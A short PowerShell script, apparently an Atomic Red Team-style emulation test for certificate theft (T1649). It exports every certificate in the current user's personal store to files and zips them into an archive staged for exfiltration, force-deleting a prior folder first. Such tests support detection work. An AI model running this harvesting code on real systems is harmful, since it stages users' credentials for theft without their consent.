$archive="$env:PUBLIC\T1649\atomic_certs.zip"
$exfilpath="$env:PUBLIC\T1649\certs"
Add-Type -assembly "system.io.compression.filesystem"
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
mkdir $exfilpath | Out-Null
foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
